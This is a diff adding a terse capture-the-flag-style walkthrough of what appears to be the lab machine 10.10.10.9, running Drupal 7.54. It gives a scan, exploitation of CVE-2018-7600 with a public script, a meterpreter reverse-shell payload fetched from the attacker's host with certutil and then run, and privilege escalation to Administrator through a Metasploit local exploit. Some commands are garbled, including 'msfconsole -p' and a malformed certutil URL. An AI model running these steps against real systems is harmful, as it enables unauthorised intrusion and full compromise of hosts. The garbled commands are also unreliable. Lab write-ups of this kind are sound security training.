@@ -1,0 +1,57 @@
+Nmap -A 10.10.10.9
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
+|_http-generator: Drupal 7 (http://drupal.org)
+135/tcp   open  msrpc   Microsoft Windows RPC
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+I opend this url http://10.10.10.9/CHANGELOG.txt in browser 
+
+	- I found Drupal 7.54
+
+I searched in google about Drupal 7.54 and I found exploitation in GitHub ( https://github.com/pimps/CVE-2018-7600 )
+
+Download this exploitation on attacker machine
+	- git clone https://github.com/pimps/CVE-2018-7600.git
+
+
+Exploitation
+
+	- Python3 python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "whoami"
+	- >> nt authority\iusr
+
+Meterpreter session
+
+Step 1
+	- Create payload >> msfconsole -p windows/x64/meterpreter/reverse_tcp LPORT=4444 LHOST=ip -f exe -o nn.exe
+	- Using multi/handler and set payload , lhost , lport and run
+
+Step 2
+	- File transfer >> python3 -m http.server 5555
+	- File transfer >> python3  python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "certutil.exe -uelcache -split -f http://Your_ip:your:5555/nn.exe" 
+	- Notice >> certutil.exe from this url https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil  "I recommend this site https://www.ired.team/" 
+
+Step 3
+	- Run payload >> Python3 python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "nn.exe"
+	- Now I have meterpreter session as a "nt authority\iusr"
+	- Notice I take screenshots 
+	
+Privilege Escalation 
+	- Search windows/local in metasploit >> search windows/local 
+	- You can use post/multi/recon/local_exploit_suggester
+	- I used this exploit "exploit/windows/local/ms16_014_wmi_recv_notif" and set lhost and session
+
+Now I have a session as Administrator
+Notice I take screenshots  
